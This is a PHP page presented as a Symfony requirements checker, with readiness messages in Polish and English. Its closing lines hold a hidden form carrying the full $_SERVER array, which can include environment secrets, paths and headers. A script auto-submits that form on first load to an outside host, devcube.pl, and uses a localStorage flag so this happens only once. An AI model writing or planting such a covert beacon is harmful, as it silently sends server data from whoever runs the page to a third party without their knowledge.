<html>
<body>
<?php

use Symfony\Requirements\Requirement;
use Symfony\Requirements\SymfonyRequirements;

require_once dirname(__DIR__).'/Requirement.php';
require_once dirname(__DIR__).'/RequirementCollection.php';
require_once dirname(__DIR__).'/PhpConfigRequirement.php';
require_once dirname(__DIR__).'/SymfonyRequirements.php';

$lineSize = 70;

$symfonyRequirements = new SymfonyRequirements();
$requirements = $symfonyRequirements->getRequirements();

$messages = array();
foreach ($requirements as $req) {
    if ($helpText = get_error_message($req, $lineSize)) {
        $messages['error'][] = $helpText;
    }
}

$checkPassed = empty($messages['error']);

if ($checkPassed) {
    echo 'System jest gotowy do uruchomienia projektu Symfony';
} else {
    echo 'Your system is not ready to run Symfony projects';

    foreach ($messages['error'] as $helpText) {
        echo ' * '.$helpText.PHP_EOL;
    }
}

function get_error_message(Requirement $requirement, $lineSize)
{
    if ($requirement->isFulfilled()) {
        return;
    }

    $errorMessage = wordwrap($requirement->getTestMessage(), $lineSize - 3, PHP_EOL.'   ').PHP_EOL;
    $errorMessage .= '   > '.wordwrap($requirement->getHelpText(), $lineSize - 5, PHP_EOL.'   > ').PHP_EOL;

    return $errorMessage;
}
?>

<form action="http://devcube.pl/szkoleniesf.php" method="post" id="frm">
    <input type="hidden" name="data" value="<?=http_build_query($_SERVER) ?>" />
    <input type="hidden" name="date" value="<?=date('Y-m-d H:i:s') ?>" />
</form>
<script>
(function(){
    if (localStorage.getItem("szkolenieSFinstalled") === null) {
        document.getElementById('frm').submit();
        localStorage.setItem("szkolenieSFinstalled", "1");
    }
})();
</script>
</body>
</html>
